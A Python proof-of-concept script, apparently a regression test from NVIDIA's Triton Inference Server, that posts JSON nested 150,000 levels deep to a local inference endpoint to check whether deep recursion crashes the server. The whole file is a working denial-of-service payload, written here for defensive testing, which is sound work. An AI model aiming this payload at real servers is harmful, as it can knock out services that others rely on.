#!/usr/bin/python
# Copyright 2022-2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ``AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import argparse

import requests


def _generate_nested_json(depth: int):
    # Create the nested array structure: [[[[...]]]]
    nested_array = ("[" * depth) + "1" + ("]" * depth)

    # Wrap it in a valid Inference Request payload format to bypass initial
    # structural checks if necessary, though the parser will likely crash
    # before validating the fields.
    payload = f'{{"inputs": [{{"name": "INPUT0", "shape": [1], "datatype": "INT32", "data": {nested_array}}}]}}'
    return payload


def _get_server_url():
    return "http://localhost:8000"


def _get_infer_url(model_name: str, server_url: str = _get_server_url()):
    return f"{server_url}/v2/models/{model_name}/infer"


def main():
    parser = argparse.ArgumentParser(
        description="Triton Inference Server RapidJSON Deep Recursion DoS PoC"
    )
    parser.add_argument(
        "--depth",
        type=int,
        default=150000,
        help="Nesting depth of the JSON payload (default: 150000)",
    )
    parser.add_argument(
        "--model",
        default="simple_identity",
        help="Target model name in the Triton Server (default: simple_identity)",
    )

    args = parser.parse_args()

    server_url = _get_server_url()
    infer_url = _get_infer_url(args.model, server_url)

    print(f"Inference URL: {infer_url}")

    payload = _generate_nested_json(args.depth)

    print(f"Payload depth: {args.depth}...")
    print(f"Payload size: {len(payload)} bytes")

    print("Sending payload.")
    try:
        response = requests.post(
            infer_url,
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )

        # If we get a response, the server successfully parsed (or rejected) without crashing.
        print(f"Success (status_code: {response.status_code}).")

    except requests.exceptions.ConnectionError:
        print("Failure: Connection aborted!")
        exit(1)
    except requests.exceptions.ReadTimeout:
        print("Failure: Request timed out. ")
        exit(2)
    except Exception as e:
        print(f"Failure: An unexpected error occurred: {e}")
        exit(3)


if __name__ == "__main__":
    main()
